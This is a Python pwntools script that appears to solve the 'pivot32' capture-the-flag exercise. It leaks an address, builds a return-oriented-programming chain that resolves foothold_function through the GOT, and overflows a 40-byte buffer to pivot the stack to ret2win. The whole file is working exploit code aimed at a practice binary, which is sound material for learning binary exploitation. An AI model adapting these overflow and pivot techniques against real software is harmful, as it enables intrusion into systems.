from pwn import *
from pprint import pprint
offset = 40

context.arch = 'i386'

elf = ELF("./pivot32")
p = elf.process()
rop = ROP(elf)

#pprint(elf.symbols)
#pprint(rop.gadgets)

# uncomment next 3 lines to debug
#gdb.attach(p, gdbscript='''
##script
#break *deregister_tm_clones
#break *pwnme+180
#break *foothold_function@plt+6
#''')

#debugging for rop gadgets
prompt = p.recvuntil(": ")
#print("prompt 1 is: ", prompt)

line = p.recvline()
line = line.decode("ascii") 
x = re.findall("0x[\w]{7,8}", line)                                                                    
print("x is: " , x)

hex_str = x[0][2:]
pivot_addr = p32(int(hex_str,16))
#print("send rop chain to : " , pivot_addr)

rop_chain_prompt = p.recvuntil(">")
#print("rop chain prompt is: " , rop_chain_prompt)

fhold_got = p32(elf.symbols['got.foothold_function'])
#print("foothold@got.plt : " , fhold_got)

# 1. pop eax; ret
eax = fhold_got
eax_gadget = p32(rop.eax.address)
#print("\'1. pop eax; ret\' gadget: " , eax_gadget)

# 2. pop ebx; ret
ebx_gadget = p32(rop.ebx.address)
#print("\'2. pop ebx; ret\' gadget: " , ebx_gadget)

# 3. add eax, ebx; ret
add_gadget = p32(elf.symbols['usefulGadgets']+7)

# 4. mov eax dword ptr [eax]; ret
mov_gadget = p32(elf.symbols['usefulGadgets']+4)

# 5. pop ebx; ret

# 6. add eax, ebx; ret

# 7. make a call to ret2win
#call_eax_gadget = b'\xf0\x85\x04\x08'
call_eax_gadget = p32(elf.symbols['deregister_tm_clones'] + 32)
#print("call eax gadget is at : " , call_eax_gadget)

#print("call eax gadget is at : " , call_eax_gadget)


pivot_gadget = p32(elf.symbols['usefulGadgets']+2)

fhold_addr = p32(elf.symbols['plt.foothold_function'])
#print("fhold fxn is at:" , fhold_addr)

rop_chain = [
        fhold_addr,          # first, call foothold_function, so that it's address in memory is linked and resolved in the got
        eax_gadget,             # 1. pop eax; ret
        eax,                    #       &foothold_function@got.plt
        mov_gadget,             # 4. mov eax dword ptr [eax]; ret
        ebx_gadget,             # 5. pop ebx; ret 
        p32(503),               #       503 is popped into ebx
        add_gadget,             # 6. add eax, ebx; ret
        call_eax_gadget
        ]

rop_chain = b"".join(rop_chain)
p.sendline(rop_chain)

stack_smash_prompt = p.recvuntil(">")
#print("stack smash prompt is: " , stack_smash_prompt)

buf = b"A" * offset  
fake_ebp = b"B" * 4

fhold_addr = p32(elf.symbols['plt.foothold_function'])
#print("fhold fxn is at:" , fhold_addr)

stack_smash_payload = [
        buf,
        fake_ebp,
        eax_gadget,
        pivot_addr,
        pivot_gadget
        ]

stack_smash_payload = b"".join(stack_smash_payload)
p.sendline(stack_smash_payload)
p.interactive()
